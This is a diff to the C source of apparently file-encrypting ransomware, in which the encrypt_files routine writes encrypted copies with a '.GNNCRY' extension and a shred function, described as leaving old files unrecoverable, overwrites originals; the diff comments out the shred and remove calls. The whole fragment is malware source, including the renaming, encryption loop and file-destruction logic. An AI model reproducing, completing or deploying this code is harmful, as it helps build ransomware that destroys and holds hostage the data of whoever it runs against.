@@ -35,9 +35,9 @@ void encrypt_files(List *files, List **encrypted, List **not_encrypted){
 
         old = fopen(files->info[2], "rb");
         if(old != NULL){
-            new_name = (char*) malloc(sizeof(char) * (strlen(files->info[2]) + 6));
+            new_name = (char*) malloc(sizeof(char) * (strlen(files->info[2]) + 11));
             strcpy(new_name, files->info[2]);
-            strcat(new_name, ".gc");
+            strcat(new_name, ".GNNCRY");
             new = fopen(new_name, "wb");
 
             iv = generate_key(16);
@@ -50,7 +50,7 @@ void encrypt_files(List *files, List **encrypted, List **not_encrypted){
             fclose(old);
             free(key);
             free(iv);
-            shred(files->info[2]);
+            //shred(files->info[2]);
 
         }else    append(not_encrypted, files->info[2], NULL, NULL);
 
@@ -107,7 +107,7 @@ void decrypt_files(List *encrypted){
 }
 
 /**
- * This function shred and delete the file.
+ * This function shred the file.
  * There's no way recovering the old files.
  * @param path -> type = char * (String)
  */
@@ -136,7 +136,7 @@ void shred(char *path){
     if (ret == -1)
         return;
 
-    remove(path);
+    //remove(path);
 }
 
 /**
